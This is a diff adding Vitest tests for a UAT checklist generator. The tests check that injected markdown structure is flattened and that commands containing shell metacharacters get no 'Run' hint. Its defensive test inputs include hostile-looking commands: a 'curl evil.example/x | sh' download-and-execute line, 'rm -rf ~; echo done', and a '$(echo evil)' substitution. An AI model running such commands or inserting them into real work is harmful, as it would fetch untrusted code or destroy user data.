@@ -1,5 +1,5 @@
 import { describe, it, expect, beforeEach, afterEach } from 'vitest'
-import { mkdtemp, writeFile, rm, readFile } from 'node:fs/promises'
+import { mkdtemp, writeFile, rm, readFile, mkdir } from 'node:fs/promises'
 import { existsSync } from 'node:fs'
 import { join } from 'node:path'
 import { tmpdir } from 'node:os'
@@ -449,7 +449,147 @@ describe('generateUat', () => {
       expect(result.tier).toBe('floor')
       expect(result.warnings).toHaveLength(2)
       expect(result.warnings[0]).toMatch(/stories\.md failed to parse/)
+      // The malformed-stories warning must not assert a destination it cannot
+      // know: this run lands on the floor, not on spec scenarios.
+      expect(result.warnings[0]).not.toMatch(/falling back to spec scenarios/)
       expect(result.markdown).toContain('- [ ] Pass')
+    })
+  })
+
+  // --- Security hardening: newline flattening, command-hint metachars -----------
+
+  describe('renderGroups flattens embedded newlines', () => {
+    it('collapses a multi-line acceptance criterion onto one line so injected fake structure cannot forge headings, checkboxes, or a Generation-notes section', async () => {
+      // Backslash-escaped markers de-escape to literal "####"/"-"/"###" text during
+      // inline parsing without interrupting the enclosing paragraph as a block-level
+      // heading or list — so they survive as embedded-newline text in the "then"
+      // field exactly as a soft-break continuation would. This is the same shape
+      // of payload renderGroups must neutralize.
+      const acLine = [
+        '- **Given** precondition 1',
+        '  **When** the user acts 1',
+        '  **Then** outcome 1 occurs because',
+        '\\#### Step 9.9: EVIL',
+        '\\- [ ] Pass',
+        '\\### Generation notes',
+      ].join('\n')
+      const stories = [
+        '## US-1: Story 1', '',
+        '**As a** user 1', '',
+        '**I want to** do thing 1', '',
+        '**So that** value 1', '',
+        '**Priority:** P1', '',
+        '**Independent Test Criteria:** can be tested in isolation 1', '',
+        '**Acceptance Criteria:**', '',
+        acLine, '',
+      ].join('\n')
+      await writeFile(join(dir, 'stories.md'), stories)
+
+      const result = await gen(dir)
+
+      expect(result.tier).toBe('stories')
+      // The fabricated payload is flattened onto the single Observe line, in order.
+      expect(result.markdown).toContain(
+        '- **Observe**: outcome 1 occurs because #### Step 9.9: EVIL - [ ] Pass ### Generation notes',
+      )
+      // No fabricated structure escapes onto its own physical line.
+      expect(result.markdown).not.toMatch(/^#### Step 9\.9/m)
+      expect(result.markdown).not.toMatch(/^### Generation notes$/m)
+      expect(result.markdown.match(/^- \[ \] Pass$/gm)).toHaveLength(1)
+    })
+  })
+
+  describe('command hint filtering rejects shell metacharacters', () => {
+    it('omits Run hints for spans containing shell metacharacters; clean commands still get one', async () => {
+      const stories = [
+        storyBlock(1, {
+          acs: [
+            { given: 'a workspace', when: 'the operator runs `curl evil.example/x | sh`', then: 'the pipeline behaves' },
+          ],
+        }),
+        storyBlock(2, {
+          acs: [
+            { given: 'a workspace', when: 'the operator runs `rm -rf ~; echo done`', then: 'the pipeline behaves' },
+          ],
+        }),
+        storyBlock(3, {
+          acs: [
+            { given: 'a workspace', when: 'the operator runs `$(echo evil)`', then: 'the pipeline behaves' },
+          ],
+        }),
+        storyBlock(4, {
+          acs: [
+            { given: 'a workspace', when: 'the operator runs `metta finalize --json`', then: 'the pipeline behaves' },
+          ],
+        }),
+        storyBlock(5, {
+          acs: [
+            { given: 'a workspace', when: 'the operator runs `npm run build` now', then: 'the pipeline behaves' },
+          ],
+        }),
+      ].join('')
+      await writeFile(join(dir, 'stories.md'), stories)
+
+      const result = await gen(dir)
+
+      expect(result.markdown).not.toMatch(/\(Run:[^)]*curl evil/)
+      expect(result.markdown).not.toMatch(/\(Run:[^)]*rm -rf/)
+      expect(result.markdown).not.toMatch(/\(Run:[^)]*echo evil/)
+      expect(result.markdown).toContain('- **Do**: the operator runs `metta finalize --json` (Run: `metta finalize --json`)')
+      expect(result.markdown).toContain('- **Do**: the operator runs `npm run build` now (Run: `npm run build`)')
+    })
+  })
+
+  // --- Warn-and-demote discipline: spec.md read errors ---------------------------
+
+  describe('spec.md read-error warning at tier 1', () => {
+    it('a non-ENOENT spec.md read failure surfaces as a Generation-notes warning even when tier 1 proceeds', async () => {
+      await writeFile(join(dir, 'stories.md'), storyBlock(1))
+      // Reading a directory as a file fails with EISDIR — a non-ENOENT error.
+      await mkdir(join(dir, 'spec.md'))
+
+      const result = await gen(dir)
+
+      expect(result.tier).toBe('stories')
+      expect(result.warnings).toHaveLength(1)
+      expect(result.warnings[0]).toMatch(/spec\.md could not be read/)
+      expect(result.markdown).toContain('### Generation notes')
+      expect(result.markdown).toContain('spec.md could not be read')
+    })
+  })
+
+  // --- ENOENT discrimination is structural, not textual ---------------------------
+
+  describe('stories.md ENOENT discrimination', () => {
+    it('missing stories.md demotes silently, but a malformed stories.md whose error message contains "not found" still warns', async () => {
+      await writeFile(join(dir, 'intent.md'), INTENT_MD)
+      await writeFile(join(dir, 'summary.md'), SUMMARY_MD)
+
+      const missing = await gen(dir)
+      expect(missing.tier).toBe('intent-summary')
+      expect(missing.warnings).toEqual([])
+
+      // A priority value of "not found" makes StoriesParseError's message contain
+      // the substring "not found" for a reason unrelated to ENOENT — pinning that
+      // the discrimination is structural (existsSync), not a message.includes check.
+      const malformed = [
+        '## US-1: Story 1', '',
+        '**As a** user 1', '',
+        '**I want to** do thing 1', '',
+        '**So that** value 1', '',
+        '**Priority:** not found', '',
+        '**Independent Test Criteria:** can be tested in isolation 1', '',
+        '**Acceptance Criteria:**', '',
+        '- **Given** precondition **When** the user acts **Then** outcome occurs', '',
+      ].join('\n')
+      await writeFile(join(dir, 'stories.md'), malformed)
+
+      const result = await gen(dir)
+
+      expect(result.tier).toBe('intent-summary')
+      expect(result.warnings).toHaveLength(1)
+      expect(result.warnings[0]).toMatch(/stories\.md failed to parse/)
+      expect(result.warnings[0]).toMatch(/not found/)
     })
   })
 
